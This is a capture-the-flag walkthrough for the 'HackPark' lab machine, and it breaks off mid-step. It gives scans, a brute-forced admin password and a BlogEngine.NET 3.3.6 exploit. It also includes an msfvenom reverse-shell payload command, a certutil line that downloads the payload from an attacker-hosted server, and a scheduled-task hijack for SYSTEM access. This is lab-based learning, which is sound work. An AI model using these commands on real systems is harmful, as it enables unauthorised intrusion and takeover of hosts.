# HackPark


## Nmap Scan
```nmap -sC -sV -v -oN scans/initial 10.10.16.166```
```nmap -A -p- -v -oN scans/all 10.10.16.166```
```
PORT     STATE SERVICE       REASON
80/tcp   open  http          syn-ack
3389/tcp open  ms-wbt-server syn-ack
```
```
PORT     STATE SERVICE    REASON  VERSION
80/tcp   open  tcpwrapped syn-ack
| http-robots.txt: 6 disallowed entries
| /Account/*.* /search /search.aspx /error404.aspx
|_/archive /archive.aspx
|_http-title: hackpark | hackpark amusements
| http-methods:
|   Supported Methods: GET HEAD OPTIONS TRACE
|_  Potentially risky methods: TRACE
3389/tcp open  tcpwrapped syn-ack
| ssl-cert: Subject: commonName=hackpark
| Issuer: commonName=hackpark
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2021-12-26T18:12:44
| Not valid after:  2022-06-27T18:12:44
| MD5:   5827 0f69 c2c5 5fc3 43f2 136c b217 9981
| SHA-1: 6a84 7d34 35f2 fc36 bfea 2f3c c19d fbba ca29 f6be
| -----BEGIN CERTIFICATE-----
| MIIC1DCCAbygAwIBAgIQMupxsK4SqKZP49v/kgQh5TANBgkqhkiG9w0BAQUFADAT
| MREwDwYDVQQDEwhoYWNrcGFyazAeFw0yMTEyMjYxODEyNDRaFw0yMjA2MjcxODEy
| NDRaMBMxETAPBgNVBAMTCGhhY2twYXJrMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEA1qEdVXjeLqQS3hsfesyH8qCVnYHtjkpbENBDZnAlSkeAEVkNPfgA
| 8SgA97oep561w/fVwJT+ZI++2NGRSG1Nj4Bp8h+RQhQFBW7GeXtnPw6TcPUasatj
| iUKHXs2qS8sCttGZbXgqCjYikwG1MKnxWuZugEFySr9t4PXfS2dM6ewGJXPTxYSp
| E4Ysl5AuY/eSDD3XqLupu9C78hlPdnzkBgdfzr0XbNvwiG+hD6EIQvLRpDJ9qSxY
| 3nclonv1YZFXxCtdwkRcb0/FK/d3JrJbKcSypzwtTjXkYUZy+BHfMCwDzOlSa7FE
| 9NGgODJrdyiDi3/THE9752uAyF7rx0/HBQIDAQABoyQwIjATBgNVHSUEDDAKBggr
| BgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQEFBQADggEBALhj+1CfNUGR
| aeIa+xhptheublS62KJbx6ety1UoWpz1E7hd/+vPbYHZ6s3ikpIxFhXPcv7mMpBn
| Fnwic6lcwxH5HmXJVTWfj/DHK4ViTLfo005aeeM1+HytNpvko0kdbKAjDby6Ag2e
| T9zvKWMc2MNmP0cGfARau4khdgmGx+5bNlIRd+MhjX/kNtiAN+CYxXrZXkZyFzOT
| WgpVncXfL0QEHDjcSFXxfJrfSU+alX3FjhB0rB81dxFLx4Ucc7A3eVeOvrnMx7lB
| qcTUeP+C5x9ASBVwYniqE1LGuI074gjwjlSq/TNId4IFR37IN0a9lGtLruPTwDu5
| eXwLOwN0wTk=
|_-----END CERTIFICATE-----
| rdp-ntlm-info:
|   Target_Name: HACKPARK
|   NetBIOS_Domain_Name: HACKPARK
|   NetBIOS_Computer_Name: HACKPARK
|   DNS_Domain_Name: hackpark
|   DNS_Computer_Name: hackpark
|   Product_Version: 6.3.9600
|_  System_Time: 2021-12-27T18:17:59+00:00

Host script results:
|_clock-skew: 0s
```


## Eumeration

Login page at: `/Account/login.aspx`

Brute force shows admin and password: `admin:1qaz2wsx`

About page shows website is running BlogEngine.net version 3.3.6.0

Searchsploit results:
```
$ searchsploit BlogEngine.NET 3.3.6
------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                  |  Path
------------------------------------------------------------------------------------------------ ---------------------------------
BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution                              | aspx/webapps/46353.cs
BlogEngine.NET 3.3.6/3.3.7 - 'dirPath' Directory Traversal / Remote Code Execution              | aspx/webapps/47010.py
BlogEngine.NET 3.3.6/3.3.7 - 'path' Directory Traversal                                         | aspx/webapps/47035.py
BlogEngine.NET 3.3.6/3.3.7 - 'theme Cookie' Directory Traversal / Remote Code Execution         | aspx/webapps/47011.py
BlogEngine.NET 3.3.6/3.3.7 - XML External Entity Injection                                      | aspx/webapps/47014.py
```

aspx/webapps/46353.cs seems to be applicable!!

## Exploitation

Uses a Directory Traversal (LFI?) vulnerability and is executed as a theme

The POC code needs to be changed to our IP and port and saved as PostView

Uploaded to the server using the file upload

Going to this URL executes the reverse shell: `http://$IP/?theme=../../App_Data/files`

Attempted to catch shell with pwncat, windows does not work well :(

Second attempt with MSF multi/handler worked!!

## Privilege Escalation w/ Metasploit

Running as "iis apppool\blog"

Upgrade to meterpreter shell:
```msfvenom -p windows/meterpreter/reverse_tcp-a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o mshell.exe```
Run Python HTTP server, get the shell with the batch command (Make sure we're in a dir we can write in, ex. C:\Users\Public\Documents):
```certutil -urlcache -split -f http://IP:8000/mshell.exe mshell.exe```
Use exploit/multi/handler to catch the shell, and we have meterpreter!

PS shows Windows Scheduler is running, what's it scheduled to run??

In "C:\Program Files (x86)\SystemScheduler" Message.exe seems to be running every 30 seconds (from log file in \events)

Use meterpreter to upload the shell we made with MSFvenom, then open another multi/handler

And we have a root shell!

## Privilege Escalation w/o Metasploit

Instead of uploading a meterpreter shell, upload a normal windows/shell_reverse_tcp

Host winPEAS.bat in the same directory and run the certutil command to grab it

Run it and 